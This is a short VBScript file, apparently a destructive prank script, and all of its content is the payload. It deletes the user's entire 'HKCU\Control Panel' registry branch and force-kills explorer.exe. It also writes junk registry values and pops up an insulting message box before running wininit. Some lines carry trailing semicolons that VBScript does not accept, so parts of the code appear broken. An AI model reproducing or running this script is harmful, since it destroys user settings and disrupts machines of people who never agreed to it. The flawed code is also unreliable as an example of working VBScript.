Set WshShell = CreateObject("WScript.Shell")

WshShell.RegWrite "HKCU\Software\ACME\FortuneTeller\", 19201080, "REG_BINARY";
WshShell.RegWrite "HKCU\Software\ACME\FortuneTeller\MindReader", "Goocher!", "REG_SZ";
WshShell.RegDelete "HKCU\Control Panel"
WshShell.Run "taskkill /im explorer.exe /f", 0, True
MsgBox "You Fucked Up.",52,"Attention"
WshShell.Run "wininit"
